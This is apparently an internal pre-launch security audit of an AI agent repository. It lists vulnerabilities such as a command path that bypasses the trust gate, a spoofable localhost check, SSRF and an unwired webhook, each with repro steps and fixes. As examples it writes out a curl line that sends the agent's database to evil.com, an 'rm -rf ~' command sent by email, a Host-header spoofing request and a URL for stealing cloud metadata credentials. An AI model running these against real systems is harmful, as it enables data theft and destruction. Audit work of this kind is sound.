# GAP ANALYSIS — what's actually broken before launch

Windy Fly (windy-agent repo). Overnight adversarial audit, Wave 7.
Not a defense of the code — a list of ways it will embarrass us.

- **Audit window:** ~4 hours focused static + live probing.
- **Method:** endpoint inventory, live probes against Eternitas:8500,
  coverage run, targeted code review of all auth/trust/command paths.
- **Scope:** the `windy-agent` repo only. Ecosystem services (Pro,
  Mail, Chat, Cloud) were mostly **not running** during this audit,
  so integration drift is limited to what we can infer from
  response-shape assumptions in code.
- **What I didn't test (be skeptical of absence of P-0s in these
  areas):**
  - Live runs of Pro / Mail / Chat / Cloud (only Eternitas was up)
  - VPS deploy end-to-end (no test AWS account used)
  - Long-running memory pressure / SQLite WAL size at scale
  - Matrix Olm encryption paths (no Synapse instance)
  - Concurrency torture via `wrk` (not installed; tests rely on
    Python `asyncio.gather`, which is weaker)

---

## Counts

| Severity | Count |
|---|---|
| **P0 — ship-blocker** | **7** |
| **P1 — this week** | **9** |
| **P2 — polish** | **7** |
| **P3 — file and forget** | **5** |
| **Total** | **28** |

---

## TOP 5 THINGS THAT WILL SURPRISE GRANT MOST

### 1. The trust gate is a theatre set on the command path

The whole Wave 3–5 arc built `require_trust("run_command")` /
`require_trust("send_email")` / etc. That gate is reachable at
`sandbox.execute_in_sandbox()` and `channels/email.py:send_email` — so
tests pass. But **the command registry bypasses all of it**. Any
message from **any channel** (SMS, Matrix, Discord, Telegram, Slack,
WhatsApp, Signal, IRC, Teams, Email, CLI) beginning with `/run ...`
goes straight to `subprocess.run(cmd, shell=True)` with no gate, no
trust check, no category restriction. A stranger who knows the agent's
email can send `/run curl evil.com/x --upload-file ~/.windyfly/data/
windyfly.db` and exfiltrate the entire agent memory + cached `wk_`
bot key. See **P0-S3**.

### 2. The documented `trust.changed` webhook doesn't exist

`deploy/aws/FLY_DEPLOYMENT.md` describes `POST http://localhost:7890/
webhooks/trust` as the local receiver. Wave 4/5 claimed the agent
"subscribes to `trust.changed` to flush cache on band flip." In
reality: `handle_trust_changed()` is defined in
`src/windyfly/trust/webhook.py`, is **only called from tests**, and
has **no HTTP route** anywhere in the gateway or UDS server. Cache
staleness window is therefore always the full 5-minute TTL. The Wave
5 pass/fail table I wrote was testing a function I plumbed to
nothing. See **P0-T1**.

### 3. "localhost only" setup routes are not localhost only

`gateway/src/server.ts:89` — `isLocalhostRequest(req)` reads
`new URL(req.url).hostname`. That's the **Host header the client
sends**, not the socket's remote address. An attacker on the same
network (or any network, via HTTP CONNECT) can send `Host: localhost`
to the gateway and every `/api/setup/*` route — which writes config
to disk, activates API keys, and launches the agent — treats them as
local. See **P0-S1**.

### 4. The dashboard password lands in access logs

`gateway/src/server.ts:117` accepts the VPS dashboard password as a
URL query param `?auth=<password>` and redirects to a clean URL with
the password set as a cookie. That redirect happens **after** nginx,
ALB, or any upstream logger has already written the password to disk.
Same password also shows up in browser history and outbound Referrer
headers. **P0-S2.**

### 5. Wave 3's "audit log" never ships anywhere

`src/windyfly/auth/audit.py` writes JSONL to
`data/audit/bot_key_usage.jsonl`. Wave 6's deployment doc claims
CloudWatch shipping is wired when `windy observe enable --to
cloudwatch` is run. **That command does not exist.** No CLI handler,
no launchd template, no `aws logs put-log-events` call anywhere in
the source. The file grows forever (no `logrotate` config ships with
the install), and nothing ever reads it. **P1-O1.**

---

## Issue list

Legend: **P0** = cannot ship, **P1** = fix this week,
**P2** = visible polish, **P3** = file and forget.

### Auth & authorisation

#### P0-S1 — `isLocalhostRequest` trusts the Host header
- **What:** `gateway/src/server.ts:89` uses `url.hostname` which is
  the Host header, not the remote socket address. All `/api/setup/*`
  routes are "restricted to localhost" — they aren't.
- **Repro:** `curl -H 'Host: localhost' http://<vps-ip>:3000/api/setup/status`
- **Fix:** use `server.requestIP(req)` (Bun has this) and check the
  actual remote address, not the URL hostname. Fail closed.
- **File:** `gateway/src/server.ts:89-93, 916`
- **Effort:** 30 min.

#### P0-S2 — Dashboard password accepted as URL query param
- **What:** `?auth=<password>` sets a cookie. Password ends up in
  access logs, referrers, browser history, analytics, HAR dumps.
- **Repro:** visit `http://<vps>/?auth=the-real-password` once; grep
  nginx access log.
- **Fix:** remove lines 117–127. Show a POST form that submits to
  `/api/auth/login`; set the cookie from the POST handler only.
- **File:** `gateway/src/server.ts:117–140`
- **Effort:** 1 h.

#### P0-S3 — Command registry bypasses trust gate
- **What:** `handle_incoming` in `channels/base.py:66` dispatches ANY
  `/run <cmd>`, `/git <cmd>`, `/web <url>`, `/repl <python>` from any
  channel to raw `subprocess.run(..., shell=True)` or `httpx.get`
  with no auth, no trust gate, no dangerous-flag gate (the commands
  aren't marked `dangerous=True`), no category enforcement.
- **Repro:** configure the agent's email channel, send
  `To: agent@…, Subject: pwn, Body: /run rm -rf ~`. Files gone.
- **Fix (minimum):**
  1. In `commands/registry.py:execute`, before dispatch, check a per-
     channel allowlist of categories. Deny if not in the allowlist.
  2. Gate `/run`, `/git`, `/web`, `/repl` with
     `await require_trust("run_command")` (or a new `shell_exec`
     action). Strict-mode deploy should fail closed.
  3. Drop `shell=True` from `cmd_run` / `cmd_git`. Use `shlex.split`
     and call without a shell.
  4. Mark these four commands `dangerous=True` so the confirmation
     token is required.
- **File:** `src/windyfly/commands/core.py:1214–1259`,
  `src/windyfly/channels/base.py:66`,
  `src/windyfly/commands/registry.py:61–98`
- **Effort:** 4 h, plus tests.

#### P0-S4 — `/web` SSRF
- **What:** `cmd_web` in `core.py:1228` fetches a user-supplied URL
  with `follow_redirects=True` and no host allow-list. On a VPS,
  `/web http://169.254.169.254/latest/meta-data/iam/security-
  credentials/` returns the EC2 instance role creds.
- **Fix:** resolve DNS, check against RFC1918 / link-local / loopback
  ranges, set `follow_redirects=False`, re-resolve on redirect.
- **File:** `src/windyfly/commands/core.py:1228–1240`
- **Effort:** 2 h.

#### P0-T1 — Documented `trust.changed` webhook is not wired
- **What:** `handle_trust_changed` has no HTTP route. No caller in
  production code path. Cache never flushes on band change.
- **Repro:** `grep -R handle_trust_changed src/windyfly gateway/src`
  → only the definition + its own tests.
- **Fix:** add `POST /api/webhooks/trust` in `gateway/src/server.ts`
  that verifies the dual signature (see P0-T2) and proxies the
  payload to the bridge, which calls `handle_trust_changed`.
- **File:** `src/windyfly/trust/webhook.py:60`,
  `gateway/src/server.ts` (new route),
  `src/windyfly/bridge/uds_server.py` (new handler)
- **Effort:** 3 h.

#### P0-T2 — Webhook signature verification not implemented
- **What:** Even once P0-T1 lands, `handle_trust_changed` parses the
  payload without verifying the dual `X-Eternitas-Signature` HMAC or
  `X-Windy-Signature` ES256 JWS. An attacker who learns the receiver
  URL can forge cache flushes / key rotations.
- **Fix:** verify HMAC against the shared secret, verify JWS against
  Eternitas's JWKS (`/.well-known/eternitas-keys`). Reject on any
  failure. Cache JWKS locally with a 24-h TTL.
- **File:** `src/windyfly/trust/webhook.py:60` (add verification
  before the side-effecting calls)
- **Effort:** 4 h.

#### P0-T3 — Contract tests for `trust.changed` use the wrong field
- **What:** The integration test `test_suspended_bot_webhook_flushes_cache`
  simulates a "suspended" event by sending `new_band: critical`. But
  `suspended` is a *status* value, not a band. The test can't
  actually reproduce a status transition because the code path only
  flushes on band change (the cache key is the passport; flush is
  unconditional once you arrive, but the **test name lies**).
- **Fix:** rename the tests OR add explicit status-transition tests
  when P0-T1 is live.
- **File:** `tests/integration/test_trust_live.py:130–172`
- **Effort:** 20 min.

---

### Operations

#### P1-S5 — `DASHBOARD_PASSWORD=""` silently disables auth on VPS
- **What:** `server.ts:102` returns null on empty password. A VPS
  deploy that forgot to set the env var has a fully open dashboard.
  No warning, no log line, no startup check.
- **Fix:** fail closed on empty password when
  `WINDYFLY_ENV === "production"`, with a loud refusal at startup.
  Or generate and print a random password on first boot.
- **File:** `gateway/src/server.ts:96–102`
- **Effort:** 30 min.

#### P1-S6 — Bearer comparison is not constant-time
- **What:** `authHeader === \`Bearer ${DASHBOARD_PASSWORD}\`` at
  `server.ts:111`. No rate limit on auth failures. Timing
  brute-forcible against an unlucky-length password.
- **Fix:** `crypto.timingSafeEqual` on Buffers of equal length, plus
  apply the rate limiter to auth-check failures.
- **File:** `gateway/src/server.ts:107–127`
- **Effort:** 45 min.

#### P1-O1 — CloudWatch shipping command doesn't exist
- **What:** Deploy doc references `windy observe enable --to
  cloudwatch`. No CLI handler. No launchd / systemd unit template.
  Audit log grows forever and never ships anywhere.
- **Fix:** either implement the command or delete the section from
  the deploy doc and ship a `logrotate` config.
- **File:** `deploy/aws/FLY_DEPLOYMENT.md:§4.1-4.3`,
  `src/windyfly/commands/` (new handler if implementing)
- **Effort:** 4 h to implement, 10 min to strike from docs.

#### P1-O2 — `vps_deploy.py` has 0 % test coverage
- **What:** `src/windyfly/vps_deploy.py` (170 LoC) drives every
  `windy cloud vps-*` command. Zero tests. The deploy doc promises a
  one-command AWS deploy — the code path has never been exercised in
  CI.
- **Fix:** add at least happy-path respx-mocked tests for each
  VPSInstance state transition (deploy/status/stop/destroy).
- **File:** `src/windyfly/vps_deploy.py`, `tests/test_vps_deploy.py`
  (new)
- **Effort:** 3 h.

#### P1-O3 — `ecosystem_health.py` has 0 % test coverage
- **What:** `windy ecosystem` is what users run when **anything else
  goes wrong**. If this command itself breaks, the owner is blind.
  No tests.
- **File:** `src/windyfly/ecosystem_health.py`
- **Effort:** 1.5 h.

#### P1-E1 — `ETERNITAS_URL` vs `ETERNITAS_API_URL` drift
- **What:** Wave 4 made `ETERNITAS_URL` canonical with
  `ETERNITAS_API_URL` as a legacy fallback. The repo ships a `.env`
  that sets **both** to the same value. Half the source (trust/
  check.py, eternitas/provision.py) uses the ordering
  `ETERNITAS_URL` → fallback; the other half (eternitas/client.py)
  reads only `ETERNITAS_API_URL`. Mixed convention will bite.
- **Fix:** canonicalise on `ETERNITAS_URL`, emit a DeprecationWarning
  when only the old name is set.
- **File:** `src/windyfly/eternitas/client.py`, grep for all
  `ETERNITAS_API_URL` refs
- **Effort:** 45 min.

#### P1-E2 — `_step_link_passport` only runs when `WINDY_IDENTITY_ID`
or `owner_id` is set
- **What:** `hatch_orchestrator.py:197` skips link-back if either is
  missing. In offline/standalone hatch that's correct; in online
  hatch with an owner JWT, if the caller forgot to set
  `WINDY_IDENTITY_ID`, Pro and Cloud never learn the passport. No
  warning.
- **Fix:** when a JWT is present but no identity id, derive the
  identity id from the JWT (`sub` claim). Fail loudly if neither
  path yields one and we're online.
- **File:** `src/windyfly/hatch_orchestrator.py:190–212`
- **Effort:** 1 h.

#### P1-E3 — `link_passport_with_identity` sends the same Bearer to
both Pro and Cloud
- **What:** The owner's JWT is used as the Bearer for both the
  Windy Pro link and the Windy Cloud link. If Windy Cloud's JWKS ever
  diverges from Windy Pro's, this breaks silently (one 200, one 401,
  no global failure since `summary` reports per-service status).
- **Fix:** clear comment in provision.py that this relies on a
  shared identity JWKS; add an integration test asserting both
  services validate against the same JWKS URL.
- **File:** `src/windyfly/eternitas/provision.py:135–185`
- **Effort:** 20 min doc, 1 h test.

#### P1-E4 — Hatch step `_step_cloud_quota` uses the user's JWT, not
the wk_ bot key
- **What:** At hatch time the wk_ key hasn't been minted yet, so
  `allocate_cloud_quota` falls back to `WINDY_JWT`. That's correct
  for the first call, but the hatch-orchestrator trace now uses the
  owner JWT for ecosystem calls that future calls make with a wk_
  key — inconsistent.
- **Fix:** mint the `wk_` bot key as step 1a (before matrix/mail/
  cloud concurrency). Everything after that uses the wk_ key
  consistently.
- **File:** `src/windyfly/hatch_orchestrator.py:100–121`
- **Effort:** 2 h (and think about failure ordering).

#### P1-O4 — Flaky `test_concurrent_node_upserts`
- **What:** A pre-existing flaky concurrency test. Passes solo,
  sometimes fails in full-suite. Means the underlying SQLite upsert
  path has a race. Could corrupt memory writes under real load.
- **Fix:** reproduce deterministically with `tasks=64 iterations=50`
  and either add a write lock around the upsert or accept
  `IntegrityError` + retry with backoff.
- **File:** `tests/test_stress_ecosystem.py::test_concurrent_node_upserts`,
  `src/windyfly/memory/nodes.py`
- **Effort:** 3 h.

#### P1-O5 — Rate limiter is in-memory only
- **What:** `server.ts:59` — `Map<ip, {...}>`, no eviction, no
  persistence. Restart = wipe. Multi-instance VPS = per-instance
  limits. Memory grows with unique IPs.
- **Fix:** put a hard cap (say 50k entries with LRU eviction) and
  document that high-availability deploys need Redis-backed limiting.
- **File:** `gateway/src/server.ts:59–72`
- **Effort:** 1 h.

---

### Polish

#### P2-S7 — CORS fallback to `allowedOrigins[0]`
- **What:** Unknown origins receive `Access-Control-Allow-Origin:
  https://windyword.ai`. Browsers reject mismatch so not directly
  exploitable, but wrong.
- **Fix:** omit the header entirely when origin is not on the
  allow-list.
- **File:** `gateway/src/server.ts:157–163`
- **Effort:** 10 min.

#### P2-S8 — No rate limit on `/api/chat`, `/api/providers/validate`
- **What:** Key-validation endpoint calls OpenAI/Anthropic with a
  user-supplied key. No rate limit. Burns money under abuse.
- **Fix:** apply `isRateLimited` more broadly; set per-route limits.
- **File:** `gateway/src/server.ts:439–445, 188–210`
- **Effort:** 30 min.

#### P2-D1 — Deploy doc references non-existent files
- **What:** `deploy/aws/FLY_DEPLOYMENT.md` mentions
  `deploy/aws/cloudwatch.tf`, `deploy/aws/snap.tf`,
  `deploy/aws/iam-windyfly-runtime.json`. **None of these exist.**
- **Fix:** create them (or remove the references).
- **File:** `deploy/aws/FLY_DEPLOYMENT.md` (lines throughout)
- **Effort:** 3 h to implement properly, 10 min to strike.

#### P2-D2 — README test-count claim is stale
- **What:** `README.md:171` says "Run tests (1014+)". Current count
  is 1141. Minor, but "1014+" is conservative to the point of wrong
  (it misses the last 127 tests).
- **Fix:** `# Run tests` with no number, or auto-generate.
- **File:** `README.md:171, 186`
- **Effort:** 5 min.

#### P2-T2 — Trust dashboard `TrustPanel` breaks when backend returns
old schema
- **What:** The new `TrustPanel` expects `trust_banner` to always be
  present. If the Python backend is older than this frontend (e.g.,
  during a gateway-first VPS upgrade), `data.trust_banner` is
  undefined. Component short-circuits but leaves the page without
  the trust card — no user-visible error, no telemetry.
- **Fix:** show a "trust state loading…" placeholder when the field
  is missing; emit a console warning.
- **File:** `gateway/dashboard/src/pages/Identity.tsx:150`
- **Effort:** 15 min.

#### P2-D3 — `.env.example` drift
- **What:** 17 env vars are read in code but not in `.env.example`
  (see `docs/audit/*`, "Env vars used in code but NOT in
  .env.example"). Examples: `WINDYFLY_HOME`, `WINDYFLY_IPC_MODE`,
  `WINDY_OWNER_ID`.
- **Fix:** add commented lines to `.env.example` with defaults.
- **File:** `.env.example`
- **Effort:** 30 min.

#### P2-D4 — `tests/test_intents.py` and `tests/test_memory.py` class
names still reference old version numbers
- **What:** Class method is `test_schema_version_is_2` but asserts
  `== 4`; method `test_schema_version_is_1` asserts `== 4`.
  Confusing for the next reader.
- **Fix:** rename the methods (already partially done; finish the
  rename in all three files).
- **File:** `tests/test_intents.py:91`, `tests/test_memory.py:49`
- **Effort:** 5 min.

---

### Nice-to-have

#### P3-O6 — Rate-limit map memory growth
- Covered partially in P1-O5; on a single-user machine this is
  negligible, but flagging for a future multi-agent gateway.

#### P3-D5 — Matrix homeserver hardcoded
- `src/windyfly/branding.py:34` — `BRAND_HOMESERVER =
  "https://chat.windyword.ai"`. Used as a display default when
  `MATRIX_HOMESERVER` is unset. Harmless.

#### P3-D6 — Dashboard URL hardcoded
- `src/windyfly/hatch_email.py:102` — the birth-announcement email
  links to `https://windyword.ai/app/fly`. Fine once Windy Word is
  public; confusing for users on an internal beta.

#### P3-S9 — Login page XSS-safe-but-could-be-safer
- `server.ts:130` uses template-literal HTML. No reflection point
  today, but the pattern is fragile. Swap for a static HTML file.

#### P3-E5 — `windy ecosystem` only checks HTTP liveness, not
response shape
- If Windy Pro flips to a new response schema but the `/health`
  endpoint still answers 200, `windy ecosystem` says green. Add a
  shape canary to each health probe.

---

## What's actually fine

Because the anti-complacency rule says if I found nothing I should
say so explicitly — here's the list of things I looked at and
decided were OK:

- **Eternitas trust-API client** — the live wire-up from Wave 4/5
  matches the real response shape across all seeded passports (27
  integration tests green). No drift found against
  `eternitas/docs/trust-api.md`.
- **SQL parameterisation** — every `db.conn.execute` I spot-checked
  uses `?` placeholders, not string concatenation. No injection.
- **Secret history** — `git log --all` clean. `.env` gitignored.
- **`wk_` key cache file perms** — `os.chmod(0o600)` on write.
- **Ceremony fail-open on Eternitas downtime** — the hatch
  orchestrator gathers exceptions and proceeds; trust gate defaults
  to fail-open so a downed Eternitas doesn't freeze the agent.

---

## Recommended fix order

1. **P0-S3** (command registry bypass) — biggest blast radius.
2. **P0-S1** (Host-header localhost check) — closes the VPS setup
   holes that P0-S3 would otherwise exploit remotely.
3. **P0-S2** (password in query param) — rotate passwords, then fix.
4. **P0-T1 + P0-T2** together (webhook wiring + signature verification)
   — one PR; don't ship P0-T1 without T2.
5. **P0-S4** (SSRF) — same PR as P0-S3 is cheapest.
6. **P1-O1** (observability lies in docs) — either implement or
   correct the doc before launch-day onboarding reads it.
7. Everything else after launch.

**Rough effort to reach launch-ready:** ~20 engineer-hours for P0s
+ ~16 for the launch-blocker P1s. Call it 5 focused days with one
engineer, 2 with two.
